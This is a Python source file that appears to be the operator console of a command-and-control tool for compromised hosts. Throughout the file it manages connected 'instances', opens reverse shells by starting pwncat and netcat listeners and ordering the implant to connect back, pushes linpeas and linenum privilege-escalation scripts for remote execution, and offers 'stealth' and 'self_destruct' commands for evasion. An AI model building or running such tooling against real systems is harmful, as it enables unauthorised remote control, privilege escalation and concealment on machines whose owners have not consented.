import errno
import time
from base64 import b64decode, b64encode

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import NestedCompleter, DynamicCompleter
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.validation import DynamicValidator, Validator
import os
import subprocess
import socket
from threading import Lock
from time import sleep
from typing import Callable, Optional, Tuple

import config
from core.command import CommandRequest, CommandTypes
from core.message import *

from instance import Instance
import instance_manager
from my_logging import Logger
import web_server


logger = Logger('APP')


def get_lambda(func: Callable, *args):
    return lambda: func(*args)


class App:
    selected_instance: Optional[Instance] = None
    _instances: Tuple[Instance] = ()

    def __init__(self):
        instance_manager.on_instances_update = self._on_instances_update
        global logger
        session = PromptSession()
        with patch_stdout(raw=True):
            while True:
                command = session.prompt(
                    lambda: f'[{self.selected_instance.username if self.selected_instance in self._instances else None}]> ',
                    completer=DynamicCompleter(lambda: NestedCompleter.from_nested_dict(self.completions)),
                    pre_run=session.default_buffer.start_completion,
                    validator=DynamicValidator(lambda: Validator.from_callable(lambda x: self.get_callable_from_command(x) is not None))
                )

                result = self.get_callable_from_command(command)()
                if isinstance(result, (list, tuple)):
                    logger.output('\n'.join(str(line) for line in result))
                elif result is not None:
                    logger.output(str(result))

    def get_callable_from_command(self, command: str) -> Optional[Callable]:
        try:
            args = []
            command_parts = command.split(' ')
            item = self.completions_with_functions
            for i in range(len(command_parts)):
                command_part = command_parts[i]
                try:
                    int(command_part)
                    item = item['INT']
                    args.append(int(command_part))
                except ValueError or KeyError:
                    item = item[command_part]
                if callable(item):
                    return get_lambda(item, *args)
        except KeyError:
            pass

    @property
    def completions_with_functions(self):
        instance_commands_if_root = {
            'stealth': self._do_stealth
        }
        instance_commands = {
            'pwncat': self._do_pwncat,
            'run': {
                'linpeas': get_lambda(self._do_run_file, 'linpeas.sh'),
                'linenum': get_lambda(self._do_run_file, 'linenum.sh'),
            },
            'self_destruct': self._do_self_destruct,
            'shell': self._do_open_shell_bash
        }
        commands = {
            'show': {
                'instances': self._list_instances
            },
            'set': {
                'instance': {
                    str(instance): get_lambda(self._do_set_selected_instance, instance.instance_id) for instance in self._instances
                }
            },

        }

        if self.selected_instance is not None:
            if self.selected_instance.is_root:
                commands = {**commands, **instance_commands_if_root}
            commands = {**commands, **instance_commands}
        return commands

    @property
    def completions(self):
        completions = {}

        def strip_functions(key_path):
            item = self.completions_with_functions
            for key in key_path:
                item = item[key]
            for key in item.keys():
                if callable(item[key]):
                    new_item = completions
                    for new_key in key_path:
                        if new_item.get(new_key, None) is None:
                            new_item[new_key] = {}
                        new_item = new_item[new_key]
                    new_item[key] = None
                else:
                    strip_functions([*key_path, key])

        strip_functions([])
        return completions

    def _do_set_selected_instance(self, instance_id: str):
        self.selected_instance = instance_manager.get_by_id(instance_id)

    def _do_run_script(self, script: str):
        logger.warn('not implemented')
        # self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.RUN_SCRIPT, script.encode()))

    def _do_pwncat(self):
        port = get_open_port()
        open_new_window_with_cmd(f'pwncat -lp {port}', f'pc:{self.selected_instance.username}@{port}')
        # wait for the pwncat listener to actually start before sending the command
        start = time.perf_counter()
        while time.perf_counter() - start < 3:
            sleep(0.1)
            if subprocess.call(f'netstat -lant | grep 0.0.0.0:{port}', shell=True, stdout=subprocess.DEVNULL) == 0:
                message = Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.OPEN_SHELL, {"port": port}).to_json())
                self.selected_instance.messages_to_send.put(message)
                return
        else:
            logger.warn(f"pwncat didn't start within 3 secs :(")

    def _do_self_destruct(self):
        message = Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.SELF_DESTRUCT).to_json())
        self.selected_instance.messages_to_send.put(message)

    def _do_open_shell_bash(self):
        port = get_open_port()
        open_new_window_with_cmd(f'nc -lvp {port}', f'nc:{self.selected_instance.username}@{port}')
        sleep(0.1)  # just wait a tiny bit for nc to start
        message = Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.OPEN_SHELL, {"port": port}).to_json())
        self.selected_instance.messages_to_send.put(message)

    def _do_stealth(self):
        self.selected_instance.messages_to_send.put(Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.GO_STEALTHY).to_json()))

    def _do_run_file(self, file_name: str):
        with open(f'resources/{file_name}', 'rb') as fh:
            contents = fh.read()
        contents_b64 = b64encode(contents).decode()
        command = CommandRequest(CommandTypes.RUN_FILE, {'contents_b64': contents_b64})
        message = Message(MessageTypes.COMMAND_REQUEST, command.to_json())
        config.run_file_commands_in_progress[command.uid] = file_name
        self.selected_instance.messages_to_send.put(message)

    def _on_instances_update(self, instances: Tuple[Instance], new_or_deleted_instance: Optional[Instance] = None):
        if new_or_deleted_instance is not None:
            if len(self._instances) > len(instances):
                logger.warn(f'Unresponsive instance removed: {new_or_deleted_instance}')
            else:
                self.selected_instance = new_or_deleted_instance
                logger.info(f'New instance connected: {new_or_deleted_instance}')

        self._instances = instances

        if self.selected_instance not in instances:
            self.selected_instance = None
        if self.selected_instance is None and len(instances) > 0:
            self.selected_instance = instances[0]

    def _list_instances(self):
        for instance in self._instances:
            logger.output(f'{"==> " if instance == self.selected_instance else "    "}{instance}')


def open_new_window_with_cmd(cmd: str, window_name=None):
    subprocess.Popen(f'tmux new-window {f"-n {window_name}" if window_name is not None else ""} {cmd}', shell=True)


_last_used_port = 50000
_port_lock = Lock()


def get_open_port():
    global _last_used_port
    with _port_lock:
        while True:
            _last_used_port += 1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.bind(('localhost', _last_used_port))
                s.close()
                return _last_used_port
            except socket.error as e:
                if e.errno == errno.EADDRINUSE:
                    pass
                else:
                    pass


def main():
    App()
